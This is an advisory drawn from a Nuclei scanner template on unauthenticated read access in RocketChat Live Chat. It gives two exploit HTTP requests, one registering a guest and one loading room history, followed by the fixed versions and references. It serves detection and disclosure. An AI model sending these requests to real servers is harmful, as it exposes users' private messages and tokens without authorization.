# Nuclei Template: RocketChat Live Chat - Unauthenticated Read Access
**Template ID:** rocketchat-unauth-access
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`unauth-message-read.yaml`)

## Vulnerability Information & PoC

## Description
RocketChat Live Chat accepts invalid parameters that could potentially allow unauthenticated access to messages and user tokens.

## Steps to reproduce / Exploit Payload
```http
POST /api/v1/method.callAnon/cve_exploit HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8

{"message":"{\"msg\":\"method\",\"method\":\"livechat:registerGuest\",\"params\":[{\"token\":\"{{value}}\",\"name\":\"cve-2020-{{value}}\",\"email\":\"{{user_email}}\"}],\"id\":\"123\"}"}

POST /api/v1/method.callAnon/cve_exploit HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/json

{"message":"{\"msg\":\"method\",\"method\":\"livechat:loadHistory\",\"params\":[{\"token\":\"{{value}}\",\"rid\":\"GENERAL\"}],\"msg\":\"123\"}"}
```

## Remediation
Fixed in versions 3.11, 3.10.5, 3.9.7, and 3.8.8.

## References
- https://docs.rocket.chat/guides/security/security-updates
- https://securifyinc.com/disclosures/rocketchat-unauthenticated-access-to-messages
